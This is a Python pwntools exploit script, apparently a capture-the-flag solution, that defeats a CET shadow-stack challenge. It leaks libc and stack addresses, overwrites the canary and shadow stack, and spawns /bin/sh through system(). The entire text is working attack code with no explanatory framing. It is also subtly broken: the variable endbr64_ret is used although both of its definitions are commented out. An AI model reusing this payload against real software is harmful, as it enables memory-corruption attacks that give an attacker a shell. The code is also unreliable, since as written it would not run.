from pwn import *
import pow_solver

context.update(arch='amd64')
l = ELF('./libc.so.6')
#p = pow_solver.remote('eof01.zoolab.org', 10102)
p = process("./run.sh")
#p.interactive()

p.recvuntil('CET CONTROL STATUS: 0x000000003 0x')
shadow_stack = int(p.recvuntil(' ')[:-1], 16) + 0xfe0

p.recvuntil('DEBUG: FS base 0x')
fsbase = int(p.recvuntil('\n')[:-1], 16)

p.recvuntil('DEBUG: shared buffer 0x')
shared_buf = int(p.recvuntil('\n')[:-1], 16)

p.recvuntil('DEBUG: printf 0x')
printf = int(p.recvuntil('\n')[:-1], 16)
libc = printf - l.sym['printf']

canary = fsbase + 0x28 - shared_buf
ssp = shadow_stack - shared_buf
rdi = (libc + 0x1ee4d0) - shared_buf
#endbr64_ret = libc + 0x26f20 + 4
#endbr64_ret = libc + 0xe6e73
endbr64_ret_off = endbr64_ret- shared_buf
system = libc + l.sym['system']

payload = flat(
    canary / 8, 0,
    ssp / 8, endbr64_ret,
    ssp / 8 + 1, system,
    rdi / 8
) + '/bin/sh\x00'

payload += '\x00' * 0x18
payload += p64(endbr64_ret)
payload += p64(system)

p.sendline(payload)

p.interactive()
